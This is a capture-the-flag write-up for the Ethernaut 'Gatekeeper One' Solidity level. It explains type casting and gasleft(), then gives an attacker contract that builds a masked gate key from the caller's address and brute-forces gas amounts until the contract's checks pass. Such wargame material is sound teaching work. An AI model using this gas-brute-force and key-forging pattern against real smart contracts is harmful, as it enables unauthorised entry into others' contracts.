---
description: type conversion and gasleft()
---

# 13 - Gatekeeper One

Ethernaut Level13: [Gatekeeper One](https://ethernaut.openzeppelin.com/level/0x2a2497aE349bCA901Fea458370Bd7dDa594D1D69)

```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

contract GatekeeperOne {

  address public entrant;

  modifier gateOne() {
    require(msg.sender != tx.origin);
    _;
  }

  modifier gateTwo() {
    require(gasleft() % 8191 == 0);
    _;
  }

  modifier gateThree(bytes8 _gateKey) {
      require(uint32(uint64(_gateKey)) == uint16(uint64(_gateKey)), "GatekeeperOne: invalid gateThree part one");
      require(uint32(uint64(_gateKey)) != uint64(_gateKey), "GatekeeperOne: invalid gateThree part two");
      require(uint32(uint64(_gateKey)) == uint16(uint160(tx.origin)), "GatekeeperOne: invalid gateThree part three");
    _;
  }

  function enter(bytes8 _gateKey) public gateOne gateTwo gateThree(_gateKey) returns (bool) {
    entrant = tx.origin;
    return true;
  }
}
```

### Goal of this level

* call `enter` successfuly without revert

### What you should know

* Type Casting (see below)
* `gaseleft()`
* bitwise `&` operation

## Type Casting

### byte

#### 1) When casted to bigger type

`bytes20` -> `bytes32`

<pre class="language-solidity"><code class="lang-solidity"><strong>bytes20 addr = 0x34B4ab0479D10FdbAA3b52C8371C7B1BE5c73bb7;
</strong>
bytes32(addr);
// 0x34b4ab0479d10fdbaa3b52c8371c7b1be5c73bb7000000000000000000000000
</code></pre>

#### 2) When casted to smaller type

`bytes20` -> `bytes8`

```solidity
bytes20 addr = 0x34B4ab0479D10FdbAA3b52C8371C7B1BE5c73bb7;

bytes8(addr);
// 0x34B4ab0479D10Fdb
```

\-> discards **lower-order** bits

### uint

#### 1) When casted to bigger type

```solidity
uint16 val = 0xabcd;

bytes32(uint256(val)); // wrapped with bytes32 to show full bits
// 0x000000000000000000000000000000000000000000000000000000000000abcd"
```

#### 2) When casted to smaller type

```solidity
uint32 val = 0xabcdabcd;

bytes2(uint16(val)); // wrapped with bytes2 to show full bits
// 0xabcd
```

\-> discards **higher-order** bits

## Solution

#### gateThree

```solidity
contract AttackGatekeeperOne {
  event Success(bool);

  function attack(address instanceAddr) external {
    bytes8 _gateKey = bytes8(uint64(0xFFFFFFFF0000FFFF) & uint64(uint160(bytes20(msg.sender))));
    for(uint256 i = 0; i < 10000; i++) {
      (bool success, ) = instanceAddr.call{gas: 24000 + i}(abi.encodeWithSignature("enter(bytes8)", _gateKey));
      if(success) {
        emit Success(true);
        break;
      }
    }
  }
}
```

```solidity
0xFFFFFFFF0000FFFF
```

This value satisfies all three conditions.



```solidity
require(uint32(uint64(_gateKey)) == uint16(uint64(_gateKey)), "GatekeeperOne: invalid gateThree part one");
// 0x0000FFFF == 0xFFFF
```

```solidity
require(uint32(uint64(_gateKey)) != uint64(_gateKey), "GatekeeperOne: invalid gateThree part two");
// 0x0000FFFF !== 0xFFFFFFFF0000FFFF
```

```solidity
require(uint32(uint64(_gateKey)) == uint16(uint160(tx.origin)), "GatekeeperOne: invalid gateThree part three");
// 0x0000FFFF == 0xFFFF
```

\-> Because of 3rd condition, we will do bitwise `&` operation.

#### gateTwo

Because the minimum amount of a transaction is `21,000 gas`, \
we will just add **3k** more gas on it (**3k** here is just an arbitrary number considering the rest of the operations) and loop it until it passes the condition of `gateTwo`.

Done! 😎
